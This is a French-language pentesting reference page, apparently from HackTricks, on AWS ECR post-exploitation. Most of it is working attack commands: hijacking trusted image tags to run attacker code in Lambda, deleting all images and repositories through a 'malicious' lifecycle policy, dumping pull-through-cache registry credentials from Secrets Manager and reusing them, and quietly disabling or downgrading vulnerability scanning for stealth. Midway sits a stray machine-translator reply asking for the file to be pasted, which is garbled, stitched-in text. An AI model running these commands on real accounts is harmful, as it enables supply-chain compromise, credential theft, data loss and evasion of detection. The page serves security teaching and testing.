# AWS - ECR Post-exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## ECR

Pour plus d'informations, consultez

{{#ref}}
../../aws-services/aws-ecr-enum.md
{{#endref}}

### Login, Pull & Push
```bash
# Docker login into ecr
## For public repo (always use us-east-1)
aws ecr-public get-login-password --region us-east-1 | docker login --username AWS --password-stdin public.ecr.aws/<random-id>
## For private repo
aws ecr get-login-password --profile <profile_name> --region <region> | docker login --username AWS --password-stdin <account_id>.dkr.ecr.<region>.amazonaws.com
## If you need to acces an image from a repo if a different account, in <account_id> set the account number of the other account

# Download
docker pull <account_id>.dkr.ecr.<region>.amazonaws.com/<repo_name>:latest
## If you still have the error "Requested image not found"
## It might be because the tag "latest" doesn't exit
## Get valid tags with:
TOKEN=$(aws --profile <profile> ecr get-authorization-token --output text --query 'authorizationData[].authorizationToken')
curl -i -H "Authorization: Basic $TOKEN" https://<account_id>.dkr.ecr.<region>.amazonaws.com/v2/<img_name>/tags/list

# Inspect the image
docker inspect sha256:079aee8a89950717cdccd15b8f17c80e9bc4421a855fcdc120e1c534e4c102e0
docker inspect <account id>.dkr.ecr.<region>.amazonaws.com/<image>:<tag> # Inspect the image indicating the URL

# Upload (example uploading purplepanda with tag latest)
docker tag purplepanda:latest <account_id>.dkr.ecr.<region>.amazonaws.com/purplepanda:latest
docker push <account_id>.dkr.ecr.<region>.amazonaws.com/purplepanda:latest

# Downloading without Docker
# List digests
aws ecr batch-get-image --repository-name level2 \
--registry-id 653711331788 \
--image-ids imageTag=latest | jq '.images[].imageManifest | fromjson'

## Download a digest
aws ecr get-download-url-for-layer \
--repository-name level2 \
--registry-id 653711331788 \
--layer-digest "sha256:edfaad38ac10904ee76c81e343abf88f22e6cfc7413ab5a8e4aeffc6a7d9087a"
```
Après avoir téléchargé les images, vous devriez **vérifier qu'elles ne contiennent pas d'informations sensibles**:

{{#ref}}
https://book.hacktricks.wiki/en/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics.html
{{#endref}}

### Overwrite a Trusted Tag via `ecr:PutImage` (Tag Hijacking / Supply Chain)

Si des consommateurs déploient par tag (par exemple `stable`, `prod`, `latest`) et que les tags sont modifiables, `ecr:PutImage` peut être utilisé pour **pointer un tag de confiance** vers du contenu contrôlé par l'attaquant en téléversant un manifest d'image sous ce tag.

Une approche courante consiste à copier le manifest d'un tag existant contrôlé par l'attaquant (ou d'un digest) et à écraser le tag de confiance avec celui-ci.
```bash
REGION=us-east-1
REPO="<repo_name>"
SRC_TAG="backdoor"   # attacker-controlled tag already present in the repository
DST_TAG="stable"     # trusted tag used by downstream systems

# 1) Fetch the manifest behind the attacker tag
MANIFEST="$(aws ecr batch-get-image \
--region "$REGION" \
--repository-name "$REPO" \
--image-ids imageTag="$SRC_TAG" \
--query 'images[0].imageManifest' \
--output text)"

# 2) Overwrite the trusted tag with that manifest
aws ecr put-image \
--region "$REGION" \
--repository-name "$REPO" \
--image-tag "$DST_TAG" \
--image-manifest "$MANIFEST"

# 3) Verify both tags now point to the same digest
aws ecr describe-images --region "$REGION" --repository-name "$REPO" --image-ids imageTag="$DST_TAG" --query 'imageDetails[0].imageDigest' --output text
aws ecr describe-images --region "$REGION" --repository-name "$REPO" --image-ids imageTag="$SRC_TAG" --query 'imageDetails[0].imageDigest' --output text
```
**Impact**: toute charge de travail récupérant `.../$REPO:$DST_TAG` recevra un contenu choisi par l'attaquant sans aucune modification des IaC, Kubernetes manifests, ou task definitions.

#### Exemple de consommateur en aval: Lambda images de conteneur se rafraîchissant automatiquement lors des mises à jour de tag

Si une fonction Lambda est déployée en tant que **image de conteneur** (`PackageType=Image`) et utilise un **ECR tag** (par ex., `:stable`, `:prod`) au lieu d'un digest, écraser ce tag peut transformer une altération de la chaîne d'approvisionnement en **exécution de code dans le rôle d'exécution Lambda** une fois la fonction rafraîchie.

Comment énumérer cette situation:
```bash
REGION=us-east-1

# 1) Find image-based Lambda functions and their ImageUri
aws lambda list-functions --region "$REGION" \
--query "Functions[?PackageType=='Image'].[FunctionName]" --output text |
tr '\t' '\n' | while read -r fn; do
img="$(aws lambda get-function --region "$REGION" --function-name "$fn" --query 'Code.ImageUri' --output text 2>/dev/null || true)"
[ -n "$img" ] && printf '%s\t%s\n' "$fn" "$img"
done

# 2) Check whether a function references a mutable tag (contains ":<tag>")
# Prefer digest pinning (contains "@sha256:") in well-hardened deployments.
```
Comment le rafraîchissement se produit fréquemment :

- CI/CD ou GitOps appelle régulièrement `lambda:UpdateFunctionCode` (même avec le même `ImageUri`) pour forcer Lambda à résoudre de nouveau le tag.
- Une automation pilotée par événements écoute les événements d'images ECR (push/mises à jour de tag) et déclenche un Lambda/une automation de rafraîchissement.

Si vous pouvez écraser le tag de confiance et qu'un mécanisme de rafraîchissement existe, la prochaine invocation de la fonction exécutera du code contrôlé par l'attaquant, qui pourra alors lire les variables d'environnement, accéder à des ressources réseau et appeler les API AWS en utilisant le rôle Lambda (par exemple, `secretsmanager:GetSecretValue`).

### `ecr:PutLifecyclePolicy` | `ecr:DeleteRepository` | `ecr-public:DeleteRepository` | `ecr:BatchDeleteImage` | `ecr-public:BatchDeleteImage`

Un attaquant disposant de l'une de ces permissions peut **créer ou modifier une lifecycle policy pour supprimer toutes les images du repository** puis **supprimer l'ensemble du ECR repository**. Cela entraînerait la perte de toutes les images de conteneurs stockées dans le repository.
```bash
# Create a JSON file with the malicious lifecycle policy
echo '{
"rules": [
{
"rulePriority": 1,
"description": "Delete all images",
"selection": {
"tagStatus": "any",
"countType": "imageCountMoreThan",
"countNumber": 0
},
"action": {
"type": "expire"
}
}
]
}' > malicious_policy.json

# Apply the malicious lifecycle policy to the ECR repository
aws ecr put-lifecycle-policy --repository-name your-ecr-repo-name --lifecycle-policy-text file://malicious_policy.json

# Delete the ECR repository
aws ecr delete-repository --repository-name your-ecr-repo-name --force

# Delete the ECR public repository
aws ecr-public delete-repository --repository-name your-ecr-repo-name --force

# Delete multiple images from the ECR repository
aws ecr batch-delete-image --repository-name your-ecr-repo-name --image-ids imageTag=latest imageTag=v1.0.0

# Delete multiple images from the ECR public repository
aws ecr-public batch-delete-image --repository-name your-ecr-repo-name --image-ids imageTag=latest imageTag=v1.0.0
```
### Exfiltrer les identifiants de registres en amont depuis ECR Pull‑Through Cache (PTC)

Si ECR Pull‑Through Cache est configuré pour des registres en amont authentifiés (Docker Hub, GHCR, ACR, etc.), les identifiants en amont sont stockés dans AWS Secrets Manager avec un préfixe de nom prévisible : `ecr-pullthroughcache/`. Les opérateurs accordent parfois aux admins ECR un accès lecture étendu à Secrets Manager, ce qui permet l'exfiltration des identifiants et leur réutilisation en dehors d'AWS.

Prérequis
- secretsmanager:ListSecrets
- secretsmanager:GetSecretValue

Énumérer les secrets PTC candidats
```bash
aws secretsmanager list-secrets \
--query "SecretList[?starts_with(Name, 'ecr-pullthroughcache/')].Name" \
--output text
```
Dump discovered secrets et analyser les champs communs
```bash
for s in $(aws secretsmanager list-secrets \
--query "SecretList[?starts_with(Name, 'ecr-pullthroughcache/')].ARN" --output text); do
aws secretsmanager get-secret-value --secret-id "$s" \
--query SecretString --output text | tee /tmp/ptc_secret.json
jq -r '.username? // .user? // empty' /tmp/ptc_secret.json || true
jq -r '.password? // .token? // empty' /tmp/ptc_secret.json || true
done
```
Optionnel : valider les leaked creds contre l'upstream (read‑only login)
```bash
echo "$DOCKERHUB_PASSWORD" | docker login --username "$DOCKERHUB_USERNAME" --password-stdin registry-1.docker.io
```
Impact
- La lecture de ces entrées Secrets Manager permet d'obtenir des identifiants réutilisables du registre en amont (username/password ou token), qui peuvent être abusés en dehors d'AWS pour récupérer des images privées ou accéder à des dépôts supplémentaires selon les permissions en amont.


### Furtivité au niveau du registre : désactiver ou rétrograder l'analyse via `ecr:PutRegistryScanningConfiguration`

Un attaquant disposant de permissions ECR au niveau du registre peut silencieusement réduire ou désactiver l'analyse automatique des vulnérabilités pour TOUS les dépôts en définissant la configuration de scanning du registre sur BASIC sans aucune règle scan-on-push. Cela empêche les nouveaux pushs d'images d'être analysés automatiquement, masquant des images vulnérables ou malveillantes.

Requirements
- ecr:PutRegistryScanningConfiguration
- ecr:GetRegistryScanningConfiguration
- ecr:PutImageScanningConfiguration (optionnel, par dépôt)
- ecr:DescribeImages, ecr:DescribeImageScanFindings (vérification)

Registry-wide downgrade to manual (no auto scans)
```bash
REGION=us-east-1
# Read current config (save to restore later)
aws ecr get-registry-scanning-configuration --region "$REGION"

# Set BASIC scanning with no rules (results in MANUAL scanning only)
aws ecr put-registry-scanning-configuration \
--region "$REGION" \
--scan-type BASIC \
--rules '[]'
```
Test avec un repo et une image
```bash
acct=$(aws sts get-caller-identity --query Account --output text)
repo=ht-scan-stealth
aws ecr create-repository --region "$REGION" --repository-name "$repo" >/dev/null 2>&1 || true
aws ecr get-login-password --region "$REGION" | docker login --username AWS --password-stdin ${acct}.dkr.ecr.${REGION}.amazonaws.com
printf 'FROM alpine:3.19\nRUN echo STEALTH > /etc/marker\n' > Dockerfile
docker build -t ${acct}.dkr.ecr.${REGION}.amazonaws.com/${repo}:test .
docker push ${acct}.dkr.ecr.${REGION}.amazonaws.com/${repo}:test

# Verify no scan ran automatically
aws ecr describe-images --region "$REGION" --repository-name "$repo" --image-ids imageTag=test --query 'imageDetails[0].imageScanStatus'
# Optional: will error with ScanNotFoundException if no scan exists
aws ecr describe-image-scan-findings --region "$REGION" --repository-name "$repo" --image-id imageTag=test || true
```
Je n’ai pas reçu le contenu du fichier src/pentesting-cloud/aws-security/aws-post-exploitation/aws-ecr-post-exploitation/README.md. Collez le contenu ici et je le traduirai en français en respectant vos consignes (conserver la syntaxe Markdown/HTML, ne pas traduire le code, noms de services, liens, chemins, tags, etc.).
```bash
# Disable scan-on-push for a specific repository
aws ecr put-image-scanning-configuration \
--region "$REGION" \
--repository-name "$repo" \
--image-scanning-configuration scanOnPush=false
```
Impact
- Les nouvelles pushes d'images dans le registry ne sont pas scannées automatiquement, ce qui réduit la visibilité du contenu vulnérable ou malveillant et retarde la détection jusqu'à ce qu'un scan manuel soit lancé.


### Registry‑wide scanning engine downgrade via `ecr:PutAccountSetting` (AWS_NATIVE -> CLAIR)

Réduisez la qualité de détection des vulnérabilités sur l'ensemble du registre en basculant le moteur de scan BASIC par défaut d'AWS_NATIVE vers le moteur legacy CLAIR. Cela n'empêche pas le scanning mais peut modifier de manière significative les résultats/couverture. Combinez avec une configuration de scan registry BASIC sans règles pour rendre les scans uniquement manuels.

Prérequis
- `ecr:PutAccountSetting`, `ecr:GetAccountSetting`
- (Optionnel) `ecr:PutRegistryScanningConfiguration`, `ecr:GetRegistryScanningConfiguration`

Impact
- Le paramètre du registre `BASIC_SCAN_TYPE_VERSION` est défini sur `CLAIR`, de sorte que les scans BASIC suivants s'exécutent avec le moteur dégradé. CloudTrail enregistre l'appel API `PutAccountSetting`.

Étapes
```bash
REGION=us-east-1

# 1) Read current value so you can restore it later
aws ecr get-account-setting --region $REGION --name BASIC_SCAN_TYPE_VERSION || true

# 2) Downgrade BASIC scan engine registry‑wide to CLAIR
aws ecr put-account-setting --region $REGION --name BASIC_SCAN_TYPE_VERSION --value CLAIR

# 3) Verify the setting
aws ecr get-account-setting --region $REGION --name BASIC_SCAN_TYPE_VERSION

# 4) (Optional stealth) switch registry scanning to BASIC with no rules (manual‑only scans)
aws ecr put-registry-scanning-configuration --region $REGION --scan-type BASIC --rules '[]' || true

# 5) Restore to AWS_NATIVE when finished to avoid side effects
aws ecr put-account-setting --region $REGION --name BASIC_SCAN_TYPE_VERSION --value AWS_NATIVE
```
### Scanner les images ECR à la recherche de vulnérabilités
```bash
#!/bin/bash

# This script pulls all images from ECR and runs snyk on them showing vulnerabilities for all images

region=<region>
profile=<aws_profile>

registryId=$(aws ecr describe-registry --region $region --profile $profile --output json | jq -r '.registryId')

# Configure docker creds
aws ecr get-login-password --region $region --profile $profile | docker login --username AWS --password-stdin $registryId.dkr.ecr.$region.amazonaws.com

while read -r repo; do
echo "Working on repository $repo"
digest=$(aws ecr describe-images --repository-name $repo --image-ids imageTag=latest --region $region --profile $profile --output json | jq -r '.imageDetails[] | .imageDigest')
if [ -z "$digest" ]
then
echo "No images! Empty repository"
continue
fi
url=$registryId.dkr.ecr.$region.amazonaws.com/$repo@$digest
echo "Pulling $url"
docker pull $url
echo "Scanning $url"
snyk container test $url --json-file-output=./snyk/$repo.json --severity-threshold=high
# trivy image -f json -o ./trivy/$repo.json --severity HIGH,CRITICAL $url
# echo "Removing image $url"
# docker image rm $url
done < <(aws ecr describe-repositories --region $region --profile $profile --output json | jq -r '.repositories[] | .repositoryName')
```
{{#include ../../../../banners/hacktricks-training.md}}
